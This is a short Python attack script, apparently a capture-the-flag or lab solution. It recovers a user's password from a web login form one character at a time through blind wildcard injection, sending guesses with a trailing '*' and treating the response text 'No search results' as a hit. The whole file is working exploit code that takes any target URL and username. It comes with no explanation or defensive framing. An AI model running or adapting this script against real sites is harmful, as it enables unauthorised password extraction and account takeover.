import requests
import argparse

# Define the list of characters to brute-force the password
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\'#$%&()*+,-./:;<=>?@[\\]^_`{|}~'

def send_request(url: str, username: str):
    data = {'username': username, 'password': ''}
    result = ''

    while True:
        found = False
        for char in characters:
            data['password'] = result + char + '*'
            response = requests.post(url, data=data)

            # Check if the current character is correct
            if 'No search results' in response.text:
                result += char
                found = True
                print(result)
                break

        # Exit loop if no characters are found, meaning password is complete
        if not found:
            break

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Brute-force password using known characters.")

    parser.add_argument('url', help="Target URL")
    parser.add_argument('username', help="Username for login")
    args = parser.parse_args()

    send_request(args.url, args.username)
